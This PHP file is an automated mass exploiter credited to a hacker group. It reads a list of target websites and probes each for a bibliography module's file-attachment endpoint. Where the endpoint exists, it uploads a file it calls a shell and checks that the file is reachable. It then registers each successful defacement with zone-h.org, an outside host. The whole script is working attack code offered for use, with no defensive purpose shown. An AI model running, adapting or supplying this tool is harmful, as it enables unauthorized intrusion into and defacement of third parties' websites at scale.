<?php
/*
# Trhacknon from Cyberizm Digital Security Team
# Our Security Forum : cyberizm.org
# Twitter : twitter.com/kngskrplls
 
# your list.txt must a single directory with this exploiter #
  
###############################################

# This Exploit and Vulnerability was discovered by Trhacknon
# Thanks for All Anonymous Hackers and Cyberizm Digital Security Team
# This Exploiter may sometimes couldn't work %100 because sometimes the bot don't understand the command.
#  If the command don't understand the command, please exploit it manually.
 
# Special thanks : All anonymous Hackers and Cyberizm Digital Security Team

#################################################
# note : Please do not remove Cyberizm copyright.
 
 
# This Exploit Coded By trhacknon from Cyberizm Digital Security Team
*/
echo "

      File Attachment Auto Exploiter - coded by Trhacknon
 
     $ Thanks for All Anonymous Hackers and Cyberizm Digital Security Team
 
";
echo "Input your target list: ";
$list = trim(fgets(STDIN));
 
$shell = "trknx.txt";
$nickzoneh = "trhacknon";
$exploit = "/admin/modules/bibliography/pop_attach.php";
$path = "/repository/";
 
$open = fopen("$list","r");
$size = filesize("$list");
$read = fread($open,$size);
$lists = explode("\r\n",$read);
 
echo "\n";
 
foreach($lists as $target){
    if(!preg_match("/^http:\/\//",$target) AND !preg_match("/^https:\/\//",$target)){
        $targets = "http://$target";
    }else{
        $targets = $target;
    }
   
    echo "Target => $targets\n";
    echo "  [*] Checking Path : ";
 
    $cd = curl_init("$targets$exploit");
    curl_setopt($cd, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($cd, CURLOPT_RETURNTRANSFER, 1);
    curl_exec($cd);
    $httpcode = curl_getinfo($cd, CURLINFO_HTTP_CODE);
    curl_close($cd);
   
    if($httpcode == 200){
        echo "200 OK\n";
        echo "  [*] Uploading shell : ";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "$targets/$exploit");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, array("fileTitle"=>"TrHaCkNoN" , "file2attach"=>"@$shell" , "upload"=>"Unggah Sekarang"));
        curl_exec($ch);
       
        $cek = curl_init();
        curl_setopt($cek, CURLOPT_URL, "$targets$path$shell");
        curl_setopt($cek, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($cek, CURLOPT_RETURNTRANSFER, 1);
        $ceek = curl_exec($cek);
        $ceeks = curl_getinfo($cek, CURLINFO_HTTP_CODE);
       
        if(preg_match("/hacked/",$ceek) or $ceeks == 200){
            echo "OK $targets$path$shell\n";
            echo "  [*] Zone-H : ";
            $zh = curl_init("http://zone-h.org/notify/single");
            curl_setopt($zh, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($zh, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($zh, CURLOPT_POST, 1);
            curl_setopt($zh, CURLOPT_POSTFIELDS, array("defacer"=>"$nickzoneh","domain1"=>"$targets$path$shell","hackmode"=>"18","reason"=>"5"));
 
            $postzh = curl_exec($zh);
            if(preg_match("/color=\"red\">OK<\/font><\/li>/i",$postzh)){
                echo "OK\n\n";
            }else{
                echo "NO\n\n";
            }
        }else{
            echo "Failed\n\n";
        }
    }else{
        echo "Not Vulnerable\n\n";
    }
}
